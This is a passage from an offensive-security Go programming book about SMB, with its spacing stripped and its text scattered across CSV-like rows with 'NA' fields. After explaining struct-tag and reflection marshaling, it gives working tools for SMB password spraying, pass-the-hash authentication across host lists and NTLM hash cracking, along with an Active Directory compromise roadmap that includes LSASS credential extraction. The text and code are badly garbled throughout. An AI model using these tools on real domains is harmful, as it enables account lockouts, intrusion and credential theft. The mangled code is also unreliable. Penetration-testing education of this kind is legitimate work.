UnderstandingMetadataandReferentialFields,NA,NA
"IfyoudigintotheSMBspecificationalittle,you’llfindthat ",NA,NA
somemessagescontainfieldsthatreferenceotherfieldsofthe ,NA,NA
"samemessage.Forexample,thefields—takenfromthe ",NA,NA
Negotiateresponsemessage—refertotheoffsetandlengthof ,NA,NA
avariable-lengthbyteslicethatcontainstheactualvalue:,NA,NA
SecurityBufferOffset(2bytes):,NA,NA
"Theoffset,inbytes,from ",NA,NA
thebeginningoftheSMB2headertothesecuritybuffer.,NA,NA
SecurityBufferLength(2bytes):,NA,NA
"Thelength,inbytes,of ",NA,NA
thesecuritybuffer.,NA,NA
Thesefieldsessentiallyactasmetadata.Laterinthe ,NA,NA
"messagespec,youfindthevariable-lengthfieldwithinwhich ",NA,NA
yourdataactuallyresides:,NA,NA
Buffer(variable):,NA,NA
Thevariable-,NA,NA
lengthbufferthatcontains ,NA,NA
"thesecuritybufferfortheresponse,asspecifiedby ",NA,NA
SecurityBufferOffsetandSecurityBufferLength.Thebuffe,NA,NA
r SHOULDcontainatokenasproducedbytheGSSprotocol,NA,NA
"asspecifiedinsection3.3.5.4.IfSecurityBufferLengthis0, ",NA,NA
"thisfieldisemptyandclient-initiatedauthentication,with ",NA,NA
"anauthenticationprotocoloftheclient’schoice,willbe ",NA,NA
"usedinsteadofserver-initiatedSPNEGOauthentication,as ",NA,NA
describedin[MS-AUTHSOD]section2.1.2.2.,NA,NA
"Generallyspeaking,thisishowtheSMBspecconsistently ",NA,NA
handlesvariable-lengthdata:fixed-positionlengthandoffset ,NA,NA
fieldsdepictingthesizeandlocationofthedataitself.Thisis ,NA,NA
"notspecifictoresponsemessagesortheNegotiatemessage, ",NA,NA
andoftenyou’llfindmultiplefieldswithinasinglemessage ,NA,NA
"usingthispattern.Really,anytimeyouhaveavariable-length ",NA,NA
"field,you’llfindthispattern.Themetadataexplicitlyinstructs ",NA,NA
themessagereceiveronhowtolocateandextractthedata.,NA,NA
"Thisisuseful,butitcomplicatesyourencodingstrategy ",NA,NA
becauseyounowneedtomaintainarelationshipbetween ,NA,NA
"differentfieldswithinastruct.Youcan’t,forexample,just ",NA,NA
marshalanentiremessagebecausesomeofthemetadatafields,NA,NA
"—forexample,lengthandoffset—won’tbeknownuntilthe ",NA,NA
"dataitselfismarshaledor,inthecaseoftheoffset,allfields ",NA,NA
precedingthedataaremarshaled.,NA,NA
UnderstandingtheSMBImplementation,NA,NA
Theremainderofthissubsectionaddressessomeoftheugly ,NA,NA
detailsregardingtheSMBimplementationwedevised.You ,NA,NA
don’tneedtounderstandthisinformationtousethepackage.,NA,NA
Weplayedaroundwithavarietyofapproachestohandle ,NA,NA
"referentialdata,eventuallysettlingonasolutionthatutilizesa ",NA,NA
combinationofstructurefieldtagsandreflection.Recallthat ,NA,NA
reflection,NA,NA
isatechniquethroughwhichaprogramcaninspect ,NA,NA
"itself,particularlyexaminingthingslikeitsowndatatypes.",NA,NA
Fieldtags,NA,NA
aresomewhatrelatedtoreflectioninthatthey ,NA,NA
definearbitrarymetadataaboutastructfield.Youmayrecall ,NA,NA
"themfrompreviousXML,MSGPACK,orJSONencoding ",NA,NA
"examples.Forexample,",NA,NA
Listing6-5,NA,NA
usesstructtagstodefine ,NA,NA
JSONfieldnames.,"typeFoostruct{
  
  
 Aint`json:""a""`
  
  
 Bstring`json:""b""`
  
  
 }
  
 Listing6-5:AstructdefiningJSONfieldtags",NA
Go’s,reflect,NA
packagecontainsthefunctionsweusedto,NA,NA
"inspectdatatypesandextractfieldtags.Atthatpoint,itwasa ",NA,NA
matterofparsingthetagsanddoingsomethingmeaningful ,NA,NA
withtheirvalues.In,NA,NA
Listing6-6,NA,NA
",youcanseeastructdefined ",NA,NA
intheSMBpackage.,"typeNegotiateResstruct{
  
 Header 
  
 StructureSizeuint16 
  
 SecurityModeuint16 
  
 DialectRevisionuint16
  
 Reserveduint16 
  
 ServerGuid[]byte`smb:""fixed:16""`❶Capabil
 itiesuint32
  
 MaxTransactSizeuint32 
  
 MaxReadSizeuint32 
  
 MaxWriteSizeuint32 
  
 SystemTimeuint64
  
 ServerStartTimeuint64 
  
 SecurityBufferOffsetuint16`smb:""offset:SecurityBlob""`❷S
 ecurityBufferLengthuint16`smb:""len:SecurityBlob""`❸Rese
 rved2uint32
  
 SecurityBlob*gss.NegTokenInit
  
 }",NA
"Thistypeusesthreefieldtags,identifiedbytheSMBkey: ",fixed,NA
"❶,",offset,NA
"❷,and",len,NA
❸.Keepinmindthatwechoseall ,NA,NA
thesenamesarbitrarily.Youaren’tobligatedtouseaspecific ,NA,NA
name.Theintentofeachtagisasfollows:,"fixedidentifiesa[]byteasafixed-lengthfieldoftheprovidedsize.Inthiscase, 
  
 ServerGuidis16bytesinlength.
  
  
 offsetdefinesthenumberofbytesfromthebeginningofthestructtothefirst 
  
 positionofavariable-lengthdatabuffer.Thetagdefinesthenameofthefield—
  
 inthiscase,SecurityBlob—towhichtheoffsetrelates.Afieldbythisreferenced 
  
 nameisexpectedtoexistinthesamestruct.
  
  
 lendefinesthelengthofavariable-lengthdatabuffer.Thetagdefinesthename 
  
 ofthefield—inthiscase,SecurityBlob,towhichthelengthrelates.Afieldby 
  
 thisreferencednameshouldexistinthesamestruct.",NA
"Asyoumighthavenoticed,ourtagsallowusnotonlyto ",NA,NA
createrelationships—througharbitrarymetadata—,NA,NA
between ,NA,NA
"differentfields,butalsotodifferentiatebetweenfixed-length ",NA,NA
"byteslicesandvariable-lengthdata.Unfortunately,adding ",NA,NA
thesestructtagsdoesn’tmagicallyfixtheproblem.Thecode ,NA,NA
needstohavethelogictolookforthesetagsandtakespecific ,NA,NA
actionsonthemduringmarshalingandunmarshaling.,NA,NA
ParsingandStoringTags,NA,NA
In,NA,NA
Listing6-7,NA,NA
",theconveniencefunction,called",parseTags(),NA
",",NA,NA
performsthetag-parsinglogicandstoresthedatainahelper ,NA,NA
structoftype,TagMap,NA
.,"funcparseTags(sfreflect.StructField❶)(*TagMap,error){ 
 ret:=&TagMap{
  
  
 m:make(map[string]interface{}),
  
  
 has:make(map[string]bool),",NA
Thefunctionacceptsaparameternamed,sf,NA
oftype ,reflect.StructField,NA
"❶,whichisatypedefinedwithinGo’s",reflect,NA
package.Thecodecalls,"sf.Tag.Get(""smb"")",NA
onthe,StructField,NA
variable ,NA,NA
toretrieveany,smb,NA
"tagsdefinedonthefield❷.Again,thisis ",NA,NA
anarbitrarynamewechoseforourprogram.Wejustneedto ,NA,NA
makesurethatthecodetoparsethetagsisusingthesamekey ,NA,NA
astheoneweusedinourstruct’stypedefinition.,NA,NA
Wethensplitthe,smb,NA
"tagsonacomma❸,incaseweneed ",NA,NA
tohavemultiple,smb,NA
tagsdefinedonasinglestructfieldinthe ,NA,NA
"future,andloopthrougheachtag❹.Wespliteachtagona ",NA,NA
colon❺—recallthatweusedtheformat,"name
 :
 value",NA
"forourtags,",NA,NA
suchas,fixed:16,NA
and,len:SecurityBlob,NA
.Withtheindividualtagdata,NA,NA
"separatedintoitsbasickeyandvaluepairing,weusea",switch,NA
"statementonthekeytoperformkey-specificvalidationlogic, ",NA,NA
suchasconvertingvaluestointegersfor,fixed,NA
tagvalues❻. ,NA,NA
"Lastly,thefunctionsetsthedatainourcustommapnamed ",ret,NA
❼.,NA,NA
InvokingtheparseTags()FunctionandCreatinga ,NA,NA
reflect.StructFieldObject,NA,NA
"Now,howdoweinvokethefunction,andhowdowecreate ",NA,NA
anobjectoftype,reflect.StructField,NA
"?Toanswerthesequestions,",NA,NA
lookatthe,unmarshal(),NA
functionin,NA,NA
Listing6-8,NA,NA
",whichiswithin",NA,NA
thesamesourcefilethathasour,parseTags(),NA
convenience,NA,NA
function.The,unmarshal(),NA
"functionisextensive,sowe’lljust",NA,NA
piecetogetherthemostrelevantportions.,"funcunmarshal(buf[]byte,vinterface{},meta*Metadata)(interface{},error){ 
 typev:=reflect.TypeOf(v)❶
  
 valuev:=reflect.ValueOf(v)❷
  
  
 --snip--
  
  
 r:=bytes.NewBuffer(buf) 
  
 switchtypev.Kind(){❸
  
 casereflect.Struct:
  
  
 --snip--
  
 casereflect.Uint8:
  
  
 --snip--
  
 casereflect.Uint16:
  
  
 --snip--
  
 casereflect.Uint32:
  
  
 --snip--
  
 casereflect.Uint64:
  
  
 --snip--
  
 casereflect.Slice,reflect.Array:
  
  
 --snip--
  
 default:",NA
The,unmarshal(),NA
functionusesGo’s,reflect,NA
packagetoretrieve ,NA,NA
thetype❶andvalue❷ofthedestinationinterfacetowhich ,NA,NA
ourdatabufferwillbeunmarshaled.Thisisnecessarybecause ,NA,NA
"inordertoconvertanarbitrarybytesliceintoastruct,weneed ",NA,NA
toknowhowmanyfieldsareinthestructandhowmanybytes ,NA,NA
"toreadforeachfield.Forexample,afielddefinedas",uint16,NA
"consumes2bytes,whereasa",uint64,NA
consumes8bytes.Byusing,NA,NA
"reflection,wecaninterrogatethedestinationinterfacetosee ",NA,NA
whatdatatypeitisandhowtohandlethereadingofdata. ,NA,NA
"Becausethelogicforeachtypewilldiffer,weperforma",switch,NA
onthetypebycalling,typev.Kind(),NA
"❸,whichreturnsa",reflect.Kind,NA
instanceindicatingthekindofdatatypewe’reworkingwith. ,NA,NA
You’llseethatwehaveaseparatecaseforeachoftheallowed ,NA,NA
datatypes.,NA,NA
HandlingStructs,NA,NA
Let’slookatthe,case,NA
"block,in",NA,NA
Listing6-9,NA,NA
",thathandlesastruct",NA,NA
"type,sincethatisalikelyinitialentrypoint.","casereflect.Struct: 
  
 m:=&Metadata{❶
  
 Tags:&TagMap{},
  
  
 Lens:make(map[string]uint64),",NA
The,case,NA
blockbeginsbydefininganew,Metadata,NA
"object❶,a ",NA,NA
"typeusedtotrackrelevantmetadata,includingthecurrent",NA,NA
"bufferoffset,fieldtags,andotherinformation.Usingourtype ",NA,NA
"variable,wecallthe",NumField(),NA
methodtoretrievethenumber ,NA,NA
offieldswithinthestruct❷.Itreturnsanintegervaluethat ,NA,NA
actsastheconstraintforaloop.,NA,NA
"Withintheloop,wecanextractthecurrentfieldthrougha ",NA,NA
calltothetype’s,Field(indexint),NA
method.Themethodreturnsa ,reflect.StructField,NA
type.You’llseeweusethismethodafewtimes ,NA,NA
throughoutthiscodesnippet.Thinkofitasretrievingan ,NA,NA
elementfromaslicebyindexvalue.Ourfirstusage❸,NA,NA
"retrievesthefieldtoextractthefield’sname.Forexample, ",SecurityBufferOffset,NA
and,SecurityBlob,NA
arefieldnameswithinthe ,NegotiateRes,NA
structdefinedin,NA,NA
Listing6-6,NA,NA
.Thefieldnameis ,NA,NA
assignedtothe,CurrField,NA
propertyofour,Metadata,NA
object.The ,NA,NA
secondcalltothe,Field(indexint),NA
methodisinputtedtothe ,parseTags(),NA
function❹from,NA,NA
Listing6-7,NA,NA
.Weknowthisfunction ,NA,NA
parsesourstructfieldtags.Thetagsareincludedinour,Metadata,NA
objectforlatertrackingandusage.,NA,NA
"Next,weusea",switch,NA
statementtoactspecificallyonthe ,NA,NA
fieldtype❺.Thereareonlytwocases.Thefirsthandles ,NA,NA
"instanceswherethefielditselfisastruct❻,inwhichcase,we ",NA,NA
makearecursivecalltothe,unmarshal(),NA
"function,passingtoita ",NA,NA
pointertothefieldasaninterface.Thesecondcasehandlesall ,NA,NA
"otherkinds(primitives,slices,andsoon),recursivelycalling ",NA,NA
the,unmarshal(),NA
functionandpassingitthefielditselfasan ,NA,NA
interface❼.Bothcallsdosomefunnybusinesstoadvancethe ,NA,NA
buffertostartatourcurrentoffset.Ourrecursivecall ,NA,NA
eventuallyreturnsan,interface{},NA
",whichisatypethatcontains ",NA,NA
ourunmarshaleddata.Weusereflectiontosetourcurrent ,NA,NA
"field’svaluetothevalueofthisinterfacedata❽.Lastly,we ",NA,NA
advanceourcurrentoffsetinthebuffer❾.,NA,NA
Yikes!Canyouseehowthiscanbeachallengeto ,NA,NA
develop?Wehaveaseparatecaseforeverykindofinput.,NA,NA
"Luckily,the",case,NA
blockthathandlesastructisthemost,NA,NA
complicated.,NA,NA
Handlinguint16,NA,NA
"Ifyouarereallypayingattention,you’reprobablyasking: ",NA,NA
wheredoyouactuallyreaddatafromthebuffer?Theanswer ,NA,NA
isnowherein,NA,NA
Listing6-9,NA,NA
.Recallthatwearemakingrecursive ,NA,NA
callstothe,unmarshal(),NA
"function,andeachtime,wepasstheinner",NA,NA
fieldstothefunction.Eventuallywe’llreachprimitivedata ,NA,NA
"types.Afterall,atsomepoint,theinnermostnestedstructsare ",NA,NA
composedofbasicdatatypes.Whenweencounterabasicdata ,NA,NA
"type,ourcodewillmatchagainstadifferentcaseinthe ",NA,NA
outermost,switch,NA
"statement.Forexample,whenweencountera",uint16,NA
"datatype,thiscodeexecutesthe",case,NA
blockin,NA,NA
Listing6-,NA,NA
10,NA,NA
.,"casereflect.Uint16:
  
  
 varretuint16 
  
 iferr:=binary.Read(r,binary.LittleEndian,&ret)❶;err!=nil{ 
 returnnil,err
  
  
 } 
  
 ifmeta.Tags.Has(""len"")❷{ 
  
 ref,err:=meta.Tags.GetString(""len"")❸iferr!
 =nil{
  
 returnnil,err
  
 } 
  
 meta.Lens[ref]❹=uint64(ret) 
  
 }
  
 ❺meta.CurrOffset+=uint64(binary.Size(ret)) 
 returnret,nil
  
 Listing6-10:Unmarshaling
 uint16
 data(
 /ch-6/smb/smb/encoder/encoder.go/
 )",NA
Inthis,case,NA
"block,wemakeacallto",binary.Read(),NA
inorderto ,NA,NA
"readdatafromourbufferintoavariable,",ret,NA
❶.Thisfunction ,NA,NA
"issmartenoughtoknowhowmanybytestoread,basedoff",NA,NA
"thetypeofthedestination.Inthiscase,",ret,NA
isa,uint16,NA
",so2bytes",NA,NA
areread.,NA,NA
"Next,wecheckwhetherthe",len,NA
fieldtagispresent❷.Ifit ,NA,NA
"is,weretrievethevalue—thatis,afieldname—tiedtothat ",NA,NA
key❸.Recallthatthisvaluewillbeafieldnametowhichthe ,NA,NA
currentfieldisexpectedtorefer.Becausethelength-,NA,NA
identifyingfieldsprecedetheactualdataintheSMB ,NA,NA
"messages,wedon’tknowwherethebufferdataactually ",NA,NA
"resides,andsowecan’ttakeanyactionyet.",NA,NA
"We’vejustacquiredlengthmetadata,andthere’snobetter ",NA,NA
placetostoreitthaninour,Metadata,NA
object.Westoreitwithina,map[string]uint64,NA
thatmaintainsarelationshipofreferencefield ,NA,NA
"namestotheirlengths❹.Phrasedanotherway,wenowknow ",NA,NA
howlongavariable-lengthbytesliceneedstobe.Weadvance ,NA,NA
"thecurrentoffsetbythesizeofthedatawejustread❺,and ",NA,NA
returnthevaluereadfromthebuffer.,NA,NA
Similarlogicandmetadatatrackinghappenintheprocess ,NA,NA
ofhandlingthe,offset,NA
"taginformation,butweomittedthatcode",NA,NA
forbrevity.,NA,NA
HandlingSlices,NA,NA
In,NA,NA
Listing6-11,NA,NA
",youcanseethe",case,NA
blockthatunmarshals,NA,NA
"slices,whichweneedtoaccountforbothfixed-andvariable-",NA,NA
lengthdatawhileusingtagsandmetadataintheprocess.,"casereflect.Slice,reflect.Array: 
  
 switchtypev.Elem().Kind()❶{ 
  
 casereflect.Uint8: 
  
 varlength,offsetint❷
  
 varerrerror",NA
"First,weusereflectiontodeterminetheslice’selement ",NA,NA
"type❶.Forexample,handlingof",[]uint8,NA
isdifferentfrom ,[]uint32,NA
",asthenumberofbytesperelementdiffers.Inthiscase,",NA,NA
we’rehandlingonly,[]uint8,NA
"slices.Next,wedefineacoupleof",NA,NA
"localvariables,",length,NA
and,offset,NA
",tousefortrackingthelengthof",NA,NA
thedatatoreadandtheoffsetwithinthebufferfromwhichto ,NA,NA
beginreading❷.Ifthesliceisdefinedwiththe,fixed,NA
"tag,we",NA,NA
retrievethevalueandassignitto,length,NA
❸.Recallthatthetag ,NA,NA
valueforthe,fixed,NA
keyisanintegerthatdefinesthelengthof,NA,NA
theslice.We’llusethislengthtoadvancethecurrentbuffer ,NA,NA
"offsetforfuturereads❹.Forfixed-lengthfields,the",offset,NA
is ,NA,NA
leftasitsdefaultvalue—zero—sinceitwillalwaysappearat ,NA,NA
thecurrentoffset.Variable-lengthslicesareslightlymore ,NA,NA
complexbecauseweretrieveboththelength❺andoffset❻i,NA,NA
nformationfromour,Metadata,NA
structure.Afieldusesitsown,NA,NA
nameasthekeyforthelookupofthedata.Recallhowwe ,NA,NA
populatedthisinformationpreviously.Withour,length,NA
and,offset,NA
"variablesproperlyset,wethencreateasliceofthedesired ",NA,NA
length❼anduseitinacallto,binary.Read(),NA
"❽.Again,this ",NA,NA
functionissmartenoughtoreadbytesupuntilourdestination ,NA,NA
slicehasbeenfilled.,NA,NA
Thishasbeenanexhaustinglydetailedjourneyintothe ,NA,NA
"darkrecessesofcustomtags,reflection,andencodingwitha ",NA,NA
hintofSMB.Let’smovebeyondthisuglinessanddo ,NA,NA
"somethingusefulwiththeSMBlibrary.Thankfully,the ",NA,NA
followingusecasesshouldbesignificantlylesscomplicated.,NA,NA
GUESSINGPASSWORDSWITHSMB,NA,NA
ThefirstSMBcasewe’llexamineisafairlycommononefor ,NA,NA
attackersandpentesters:onlinepasswordguessingoverSMB. ,NA,NA
You’lltrytoauthenticatetoadomainbyprovidingcommonly ,NA,NA
"usedusernamesandpasswords.Beforedivingin,you’llneed ",NA,NA
tograbtheSMBpackagewiththefollowing,get,NA
command:,"$
 gogetgithub.com/bhg/ch-6/smb",NA
"Oncethepackageisinstalled,let’sgettocoding.Thecode",NA,NA
you’llcreate(shownin,NA,NA
Listing6-12,NA,NA
)acceptsafileofnewline-,NA,NA
"separatedusernames,apassword,adomain,andtargethost ",NA,NA
informationascommandlinearguments.Toavoidlocking ,NA,NA
"accountsoutofcertaindomains,you’llattemptasingle ",NA,NA
passwordacrossalistofusersratherthanattemptalistof ,NA,NA
passwordsacrossoneormoreusers.,"WARNING
  
 Onlinepasswordguessingcanlockaccountsoutofadomain,effectively 
 resultinginadenial-of-serviceattack.Takecautionwhentestingyourcode 
 andrunthisagainstonlysystemsonwhichyou’reauthorizedtotest.
  
  
  
  
  
 funcmain(){
  
 iflen(os.Args)!=5{ 
  
 log.Fatalln(""Usage:main</user/file><password><domain> 
 <target_host>"") 
  
 }
  
 buf,err:=ioutil.ReadFile(os.Args[1]) 
  
 iferr!=nil{ 
  
 log.Fatalln(err)
  
 } 
  
 options:=smb.Options❶{ 
  
 Password:os.Args[2],
  
 Domain:os.Args[3], 
  
 Host:os.Args[4], 
  
 Port:445, 
  
 }
  
 users:=bytes.Split(buf,[]byte{'\n'})
  
 for_,user:=rangeusers❷{
  
  
 ❸options.User=string(user) 
  
 session,err:=smb.NewSession(options,false)❹
  
 iferr!=nil{
  
 fmt.Printf(""[-]Loginfailed:%s\\%s[%s]\n"", 
  
 options.Domain,
  
 options.User,",NA
TheSMBpackageoperatesonsessions.Toestablisha ,NA,NA
"session,youfirstinitializean",smb.Options,NA
instancethatwill,NA,NA
"containallyoursessionoptions,includingtargethost,user, ",NA,NA
"password,port,anddomain❶.Next,youloopthrougheach ",NA,NA
"ofyourtargetusers❷,settingthe",options.User,NA
value ,NA,NA
"appropriately❸,andissueacallto",smb.NewSession(),NA
❹.This ,NA,NA
functiondoesalotofheavyliftingforyoubehindthescenes: ,NA,NA
itnegotiatesboththeSMBdialectandauthentication ,NA,NA
"mechanism,andthenauthenticatestotheremotetarget.The",NA,NA
"functionwillreturnanerrorifauthenticationfails,anda ",NA,NA
boolean,IsAuthenticated,NA
fieldonthe,session,NA
structispopulated,NA,NA
basedofftheoutcome.Itwillthencheckthevaluetosee ,NA,NA
"whethertheauthenticationsucceeded,andifitdid,displaya ",NA,NA
successmessage❺.,NA,NA
Thatisallittakestocreateanonlinepassword-guessing ,NA,NA
utility.,NA,NA
REUSINGPASSWORDSWITHTHE PASS-,NA,NA
THE-HASHTECHNIQUE,NA,NA
PASS-THE-HASHTECHNIQUE,NA,NA
The,NA,NA
pass-the-hash,NA,NA
techniqueallowsanattackertoperform ,NA,NA
"SMBauthenticationbyusingapassword’sNTLMhash,even ",NA,NA
iftheattackerdoesn’thavethecleartextpassword.This ,NA,NA
sectionwalksyouthroughtheconceptandshowsyouan ,NA,NA
implementationofit.,NA,NA
Pass-the-hashisashortcuttoatypical,NA,NA
ActiveDirectory ,NA,NA
domaincompromise,NA,NA
",atypeofattackinwhichattackersgain ",NA,NA
"aninitialfoothold,elevatetheirprivileges,andmovelaterally ",NA,NA
throughoutthenetworkuntiltheyhavetheaccesslevelsthey ,NA,NA
needtoachievetheirendgoal.ActiveDirectorydomain ,NA,NA
compromisesgenerallyfollowtheroadmappresentedinthis ,NA,NA
"list,assumingtheytakeplacethroughanexploitratherthan ",NA,NA
somethinglikepasswordguessing:,"1.
  Theattackerexploitsthevulnerabilityandgainsafootholdonthenetwork. 
 2.
  
 Theattackerelevatesprivilegesonthecompromisedsystem.
  
 3.
  TheattackerextractshashedorcleartextcredentialsfromLSASS.
  
 4.
  Theattackerattemptstorecoverthelocaladministratorpasswordviaoffline 
  
 cracking.
  
 5.
  Theattackerattemptstoauthenticatetoothermachinesbyusingthe 
  
 administratorcredentials,lookingforreuseofthepassword.
  
 6.
  Theattackerrinsesandrepeatsuntilthedomainadministratororothertargethas 
  
 beencompromised.",NA
"WithNTLMSSPauthentication,however,evenifyoufail ",NA,NA
"torecoverthecleartextpasswordduringstep3or4,youcan ",NA,NA
proceedtousethepassword’sNTLMhashforSMB ,NA,NA
authenticationduringstep5—,NA,NA
"inotherwords,passingthehash.",NA,NA
Pass-the-hashworksbecauseitseparatesthehash ,NA,NA
calculationfromthechallenge-,NA,NA
responsetokencalculation.To ,NA,NA
"seewhythisis,let’slookatthefollowingtwofunctions,",NA,NA
"definedbytheNTLMSSPspecification,pertainingtothe",NA,NA
cryptographicandsecuritymechanismsusedfo,NA,NA
r authentication:,NA,NA
NTOWFv2,NA,NA
AcryptographicfunctionthatcreatesanMD5,NA,NA
"HMACbyusingtheusername,domain,andpassword ",NA,NA
values.ItgeneratestheNTLMhashvalue.,NA,NA
ComputeResponse,NA,NA
AfunctionthatusestheNTLMhashin,NA,NA
combinationwiththemessage’sclientandserver ,NA,NA
"challenges,timestamp,andtargetservernametoproducea ",NA,NA
GSS-APIsecuritytokenthatcanbesentforauthentication.,NA,NA
Youcanseetheimplementationsofthesefunctionsin ,NA,NA
Listing6-13,NA,NA
.,"funcNtowfv2(pass,user,domainstring)[]byte{
  
 h:=hmac.New(md5.New,Ntowfv1(pass)) 
  
 h.Write(encoder.ToUnicode(strings.ToUpper(user)+domain)
 ) returnh.Sum(nil) 
  
 }
  
 funcComputeResponseNTLMv2(nthash❶,lmhash,clientChallenge, 
 serverChallenge,timestamp,
  
 serverName[]byte)[]byte{
  
 temp:=[]byte{1,1} 
  
 temp=append(temp,0,0,0,0,0,0) 
  
 temp=append(temp,timestamp...) 
  
 temp=append(temp,clientChallenge...) 
  
 temp=append(temp,0,0,0,0) 
  
 temp=append(temp,serverName...) 
  
 temp=append(temp,0,0,0,0)
  
 h:=hmac.New(md5.New,nthash) 
  
 h.Write(append(serverChallenge,temp...)) 
  
 ntproof:=h.Sum(nil)
  
 returnappend(ntproof,temp...)",NA
TheNTLMhashissuppliedasinputtothe ,ComputeResponseNTLMv2,NA
"function❶,meaningthehashhasbeen ",NA,NA
createdindependentlyofthelogicusedforsecuritytoken ,NA,NA
creation.Thisimpliesthathashesstoredanywhere—evenin ,NA,NA
"LSASS—areconsideredprecalculated,becauseyoudon’t ",NA,NA
"needtosupplythedomain,user,orpasswordasinput.The ",NA,NA
authenticationprocessisasfollows:,"1.
  Calculatetheuser’shashbyusingthedomain,user,andpasswordvalues. 
 2.
  
 UsethehashasinputtocalculateauthenticationtokensforNTLMSSPover 
  
  
 SMB.",NA
"Sinceyoualreadyhaveahashinhand,you’vealready ",NA,NA
"completedstep1.Topassthehash,youinitiateyourSMB ",NA,NA
"authenticationsequence,asyoudefineditwaybackinthe ",NA,NA
"openingsectionsofthischapter.However,younevercalculate ",NA,NA
"thehash.Instead,youusethesuppliedvalueasthehashitself.",NA,NA
Listing6-14,NA,NA
showsapass-the-hashutilitythatusesa ,NA,NA
passwordhashtoattempttoauthenticateasaspecificusertoa ,NA,NA
listofmachines.,"funcmain(){
  
 iflen(os.Args)!=5{ 
  
 log.Fatalln(""Usage:main<target/hosts><user><domain><hash>"")
  
 }
  
  
 buf,err:=ioutil.ReadFile(os.Args[1])
  
 iferr!=nil{ 
  
 log.Fatalln(err)
  
 }
  
  
 options:=smb.Options{",NA
Thiscodeshouldlooksimilartothepassword-guessing,NA,NA
example.Theonlysignificantdifferencesarethatyou’re ,NA,NA
settingthe,Hash,NA
fieldof,smb.Options,NA
(notthe,Password,NA
field)❶and ,NA,NA
you’reiteratingoveralistoftargethosts(ratherthantarget ,NA,NA
users)❷.Thelogicwithinthe,smb.NewSession(),NA
functionwilluse ,NA,NA
thehashvalueifpopulatedwithinthe,options,NA
struct.,NA,NA
RECOVERINGNTLMPASSWORDS,NA,NA
"Insomeinstances,havingonlythepasswordhashwillbe ",NA,NA
"inadequateforyouroverallattackchain.Forexample,many",NA,NA
"services(suchasRemoteDesktop,OutlookWebAccess,and",NA,NA
others)don’tallowhash-,NA,NA
"basedauthentication,becauseiteither ",NA,NA
isn’tsupportedorisn’tadefaultconfiguration.Ifyourattack ,NA,NA
"chainrequiresaccesstooneoftheseservices,you’llneeda ",NA,NA
"cleartextpassword.Inthefollowingsections,you’llwalk ",NA,NA
throughhowhashesarecalculatedandhowtocreateabasic ,NA,NA
passwordcracker.,NA,NA
CalculatingtheHash,NA,NA
In,NA,NA
Listing6-15,NA,NA
",youperformthemagicofcalculatingthehash.","funcNewAuthenticatePass(domain,user,workstation,passwordstring,c
  
 Challenge)Authenticate 
  
 { 
  
 //Assumesdomain,user,andworkstationarenotunicode 
  
 nthash:=Ntowfv2(password,user,domain) 
  
 lmhash:=Lmowfv2(password,user,domain) 
  
 returnnewAuthenticate(domain,user,workstation,nthash,lmhash,c)
  
 }
  
  
 funcNewAuthenticateHash(domain,user,workstation,hashstring,cChallenge)
  
 Authenticate{ 
  
 //Assumesdomain,user,andworkstationarenotunicode 
 buf:=make([]byte,len(hash)/2) 
  
 hex.Decode(buf,[]byte(hash)) 
  
 returnnewAuthenticate(domain,user,workstation,buf,buf,c)
  
 }
  
 Listing6-15:Calculatinghashes(
 /ch-6/smb/ntlmssp/ntlmssp.go
 )",NA
Thelogictocalltheappropriatefunctionisdefined ,NA,NA
"elsewhere,butyou’llseethatthetwofunctionsaresimilar. ",NA,NA
Therealdifferenceisthatpassword-,NA,NA
basedauthenticationin ,NA,NA
the,NewAuthenticatePass(),NA
functioncomputesthehashbefore,NA,NA
"generatingtheauthenticationmessage,whereasthe ",NewAuthenticateHash(),NA
functionskipsthatstepandusesthe,NA,NA
suppliedhashdirectlyasinputtogeneratethemessage.,NA,NA
RecoveringtheNTLMHash,NA,NA
In,NA,NA
Listing6-16,NA,NA
",youcanseeautilitythatrecoversapassword ",NA,NA
bycrackingasuppliedNTLMhash.,"funcmain(){
  
 iflen(os.Args)!=5{ 
  
 log.Fatalln(""Usage:main<dictionary/file><user><domain><hash>"") }
  
 hash:=make([]byte,len(os.Args[4])/2) 
  
 _,err:=hex.Decode(hash,[]byte(os.Args[4]))❶ife
 rr!=nil{
  
 log.Fatalln(err) 
  
 }
  
 f,err:=ioutil.ReadFile(os.Args[1]) 
  
 iferr!=nil{ 
  
 log.Fatalln(err) 
  
 }
  
 varfoundstring
  
 passwords:=bytes.Split(f,[]byte{'\n'}) 
  
 for_,password:=rangepasswords❷{ 
  
 h:=ntlmssp.Ntowfv2(string(password),os.Args[2],os.Args[3])❸ifby
 tes.Equal(hash,h)❹{ 
  
 found=string(password)
  
 break 
  
 } 
  
 } 
  
 iffound!=""""{ 
  
 fmt.Printf(""[+]Recoveredpassword:%s\n"",found) 
  
 }else{ 
  
 fmt.Println(""[-]Failedtorecoverpassword"") 
  
 }
  
 }
  
 Listing6-16:NTLMhashcracking(
 /ch-6/password-recovery/main.go
 )
  
  
 HivaNetwork.Com",NA
"Theutilityreadsthehashasacommandlineargument, ",NA,NA
decodingittoa,[]byte,NA
❶.Thenyouloopoverasupplied ,NA,NA
"passwordlist❷,calculatingthehashofeachentrybycalling ",NA,NA
the,ntlmssp.Ntowfv2(),NA
functionwediscussedpreviously❸.,NA,NA
"Finally,youcomparethecalculatedhashwiththatofour ",NA,NA
"suppliedvalue❹.Iftheymatch,youhaveahitandbreakout ",NA,NA
oftheloop.,NA,NA
SUMMARY,NA,NA
"You’vemadeitthroughadetailedexaminationofSMB, ",NA,NA
"touchingonprotocolspecifics,reflection,structurefieldtags, ",NA,NA
andmixedencoding!Youalsolearnedhowpass-the-hash ,NA,NA
"works,aswellasafewusefulutilityprogramsthatleverage ",NA,NA
theSMBpackage.,NA,NA
"Tocontinueyourlearning,weencourageyoutoexplore ",NA,NA
"additionalSMBcommunications,particularlyinrelationto ",NA,NA
"remotecodeexecution,suchasPsExec.Usinganetwork ",NA,NA
"sniffer,suchasWireshark,capturethepacketsandevaluate ",NA,NA
howthisfunctionalityworks.,NA,NA
"Inthenextchapter,wemoveonfromnetworkprotocol ",NA,NA
specificstofocusonattackingandpillagingdatabases.,NA,NA
7 ,NA,NA
ABUSINGDATABASESAND ,NA,NA
FILESYSTEMS,NA,NA
Nowthatwe’vecoveredthemajorityofcommonnetwork ,NA,NA
"protocolsusedforactiveserviceinterrogation,commandan",NA,NA
d ,NA,NA
"control,andothermaliciousactivity,let’sswitchourfocusto ",NA,NA
anequallyimportanttopic:datapillaging.,NA,NA
Althoughdatapillagingmaynotbeasexcitingasinitial ,NA,NA
"exploitation,lateralnetworkmovement,orprivilege ",NA,NA
